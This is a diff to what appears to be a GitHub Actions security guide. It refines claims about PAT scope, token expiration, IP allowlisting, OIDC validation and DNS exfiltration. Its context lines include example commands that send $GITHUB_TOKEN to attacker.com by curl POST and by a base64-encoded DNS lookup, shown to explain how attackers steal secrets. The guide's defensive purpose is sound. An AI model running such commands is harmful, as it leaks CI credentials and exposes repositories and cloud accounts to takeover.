@@ -12,7 +12,7 @@ GitHub Actions workflows have access to credentials (GITHUB_TOKEN, PATs, deploy 
 |------------|---------------|----------------------|
 | `GITHUB_TOKEN` (read) | Read repo contents | Clone private repo code |
 | `GITHUB_TOKEN` (write) | Read/write contents, PRs, issues | Push commits, merge PRs, modify releases |
-| Personal Access Token (classic) | All repos the user can access | Full account compromise across repos |
+| Personal Access Token (classic) | Depends on scopes, resource access, SSO and policies | Impact is limited to effective token permissions, potentially across repos |
 | Fine-grained PAT | Specified repos/permissions | Scoped but still persistent access |
 | Deploy key (read) | Single repo read | Clone single repo |
 | Deploy key (write) | Single repo read/write | Push to single repo, modify contents |
@@ -158,9 +158,9 @@ jobs:
 |---------|-------------|-------------------|
 | Repository scope | All repos or all public | Specific repos |
 | Permission granularity | Broad scopes | Per-permission |
-| Expiration | Optional | Required |
+| Expiration | Depends on token/org policy | Depends on selected expiry and org policy |
 | Org approval | No | Optional |
-| IP allowlisting | No | Yes |
+| IP allowlisting | Organization/policy dependent | Organization/policy dependent |
 
 ### Use OIDC Instead of Long-Lived Cloud Credentials
 
@@ -170,7 +170,7 @@ env:
   AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
   AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET }}
 
-# SAFE: OIDC federation — no stored credentials
+# OIDC avoids long-lived stored keys; validate issuer/audience/subject and environment policy
 permissions:
   id-token: write
   contents: read
@@ -191,7 +191,7 @@ Attackers extract credentials via:
 # Direct HTTP exfiltration
 curl -d "token=$GITHUB_TOKEN" https://attacker.com/collect
 
-# DNS exfiltration (bypasses egress filtering)
+# DNS exfiltration (requires permitted DNS resolution; not a universal egress bypass)
 dig $(echo $GITHUB_TOKEN | base64).attacker.com
 
 # Via workflow logs (if token not masked)
